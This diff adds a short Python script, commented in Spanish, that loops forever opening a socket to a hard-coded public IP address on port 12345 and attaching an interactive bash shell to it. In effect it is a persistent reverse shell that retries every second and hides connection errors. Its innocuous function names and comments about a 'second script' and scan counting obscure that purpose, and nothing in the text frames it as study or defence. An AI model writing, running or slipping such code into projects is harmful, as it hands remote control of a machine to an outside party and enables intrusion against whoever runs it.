@@ -1,0 +1,46 @@
+#!/usr/bin/env python3
+
+import subprocess
+import time
+import os
+import socket
+
+def ejecutar_segundo():
+    # Definir la dirección IP y el puerto del segundo script
+    #IP_SEGUNDO = "10.0.4.43"
+    IP_SEGUNDO = "161.35.147.18"
+    PUERTO_SEGUNDO = 12345
+
+    # Crear el socket
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    # Conectar al servidor del segundo script
+    try:
+        s.connect((IP_SEGUNDO, PUERTO_SEGUNDO))
+
+        # Redirigir la entrada y salida estándar al socket
+        subprocess.call(["/bin/bash", "-i"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())
+
+    except ConnectionRefusedError:
+        pass  # No imprimir mensaje de error si la conexión es rechazada
+
+def ejecutar_primer_script():
+    # Contador para el número de escaneos
+    counter = 0
+    
+    while True:
+        counter += 1
+
+        # Llamar al segundo script
+        ejecutar_segundo()
+
+        # Esperar un tiempo límite
+        tiempo_limite = 1  # 1 segundo
+        time.sleep(tiempo_limite)
+
+def main():
+    while True:
+        ejecutar_primer_script()
+
+if __name__ == "__main__":
+    main()
